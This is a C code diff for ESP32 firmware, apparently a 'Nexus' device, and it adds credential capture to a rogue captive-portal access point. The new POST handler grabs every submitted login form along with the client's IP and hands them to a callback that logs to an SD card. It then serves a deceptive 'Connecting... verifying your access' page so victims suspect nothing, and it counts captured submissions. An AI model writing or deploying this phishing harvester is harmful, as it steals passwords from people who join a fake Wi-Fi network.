@@ -310,6 +310,12 @@ static int            g_cp_html_len = 0;
 static volatile int   g_cp_hits = 0;
 static TaskHandle_t   g_dns_task = 0;
 static volatile bool  g_dns_run = false;
+static volatile int   g_cp_caps = 0;    // form submissions captured
+static void (*g_cp_cap_cb)(const char* body, const char* ip) = 0;
+
+void wifi_net_cp_set_capture(void (*cb)(const char* body, const char* ip)) {
+  g_cp_cap_cb = cb;
+}
 
 static esp_err_t cp_get_handler(httpd_req_t* req) {
   g_cp_hits++;
@@ -320,6 +326,39 @@ static esp_err_t cp_get_handler(httpd_req_t* req) {
   else
     httpd_resp_send(req, "<html><body>Nexus Captive Portal</body></html>",
                     HTTPD_RESP_USE_STRLEN);
+  return ESP_OK;
+}
+
+// Capture a submitted login form. Reads the urlencoded body, grabs the client
+// IP, hands both to the registered callback (which logs to SD), then returns a
+// plausible "connecting" page.
+static esp_err_t cp_post_handler(httpd_req_t* req) {
+  char body[513];
+  int total = 0, rem = req->content_len;
+  if (rem > (int)sizeof(body) - 1) rem = (int)sizeof(body) - 1;
+  while (rem > 0) {
+    int r = httpd_req_recv(req, body + total, rem);
+    if (r <= 0) { if (r == HTTPD_SOCK_ERR_TIMEOUT) continue; break; }
+    total += r; rem -= r;
+  }
+  body[total] = 0;
+  char ip[20] = "?";
+  int sock = httpd_req_to_sockfd(req);
+  if (sock >= 0) {
+    struct sockaddr_in6 sa; socklen_t sl = sizeof(sa);
+    if (getpeername(sock, (struct sockaddr*)&sa, &sl) == 0) {
+      struct sockaddr_in* s4 = (struct sockaddr_in*)&sa;
+      inet_ntoa_r(s4->sin_addr, ip, sizeof(ip));
+    }
+  }
+  if (total > 0) { g_cp_caps++; if (g_cp_cap_cb) g_cp_cap_cb(body, ip); }
+  httpd_resp_set_type(req, "text/html");
+  httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+  httpd_resp_send(req,
+    "<html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
+    "</head><body style=\"font-family:sans-serif;text-align:center;padding-top:40px\">"
+    "<h3>Connecting...</h3><p>Please wait while we verify your access.</p></body></html>",
+    HTTPD_RESP_USE_STRLEN);
   return ESP_OK;
 }
 
@@ -365,12 +404,16 @@ bool wifi_net_cp_start(const char* ssid, const char* html, int htmllen) {
   g_cp_html = html; g_cp_html_len = htmllen; g_cp_hits = 0;
   httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
   hc.uri_match_fn     = httpd_uri_match_wildcard;
-  hc.max_uri_handlers = 4;
+  hc.max_uri_handlers = 8;
   hc.lru_purge_enable = true;
+  g_cp_caps = 0;
   if (httpd_start(&g_httpd, &hc) != ESP_OK) { wifi_net_ap_stop(); return false; }
   httpd_uri_t u = {};
   u.uri = "/*"; u.method = HTTP_GET; u.handler = cp_get_handler;
   httpd_register_uri_handler(g_httpd, &u);
+  httpd_uri_t up = {};
+  up.uri = "/*"; up.method = HTTP_POST; up.handler = cp_post_handler;
+  httpd_register_uri_handler(g_httpd, &up);
   g_dns_run = true;
   if (xTaskCreate(dns_task, "cp_dns", 3072, 0, 5, &g_dns_task) != pdPASS)
     g_dns_task = 0;
@@ -386,3 +429,4 @@ void wifi_net_cp_stop(void) {
 }
 
 int wifi_net_cp_hits(void) { return g_cp_hits; }
+int wifi_net_cp_caps(void) { return g_cp_caps; }
